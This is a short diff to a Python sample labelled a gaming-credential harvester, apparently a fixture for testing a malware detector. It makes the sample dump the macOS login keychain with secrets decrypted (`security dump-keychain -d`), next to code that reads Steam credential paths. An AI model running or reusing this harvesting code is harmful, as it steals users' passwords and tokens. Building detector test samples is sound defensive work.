@@ -1,6 +1,6 @@
 """Python gaming-credential harvester (harvest composite lock).
 
-Combines Steam credential paths with a whole-keychain dump: the two legs
+Combines Steam credential paths with a decrypted Keychain dump: the two legs
 together must still convict the gaming harvest composite now that the
 keychain leg lives in its canonical keychain/extract home.
 """
@@ -22,7 +22,7 @@ def harvest():
         except OSError:
             continue
     proc = subprocess.run(
-        ["security", "dump-keychain", os.path.expanduser(
+        ["security", "dump-keychain", "-d", os.path.expanduser(
             "~/Library/Keychains/login.keychain-db")],
         capture_output=True,
         check=False,
